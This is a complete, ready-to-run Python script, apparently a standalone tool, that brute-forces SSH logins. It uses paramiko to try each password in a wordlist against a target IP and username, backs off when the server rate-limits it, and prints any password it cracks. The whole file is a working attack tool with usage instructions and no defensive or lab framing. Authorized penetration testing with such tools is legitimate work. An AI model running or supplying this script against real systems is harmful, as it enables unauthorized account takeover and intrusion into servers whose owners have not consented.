import paramiko
import sys
import time

def ssh_brute_force(ip, username, password_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(password_file, "r", encoding="utf-8") as file:
        passwords = file.readlines()

    print(f"[+] Starting Brute-Force SSH {ip} with username '{username}'")

    for password in passwords:
        password = password.strip()
        try:
            ssh.connect(ip, username=username, password=password, timeout=3)
            print(f"[✓] DONE! Password is: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[-] FAILED: {password}")
        except paramiko.SSHException:
            print("[!] Too many request, standby...")
            time.sleep(5)
        except Exception as e:
            print(f"[!] Unexpected Error: {e}")
            return
    print("[×] No password was found!")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("How to use: python ssh_brute_force.py <IP> <username> <password_file>")
        sys.exit(1)

    target_ip = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]

    ssh_brute_force(target_ip, username, password_file)
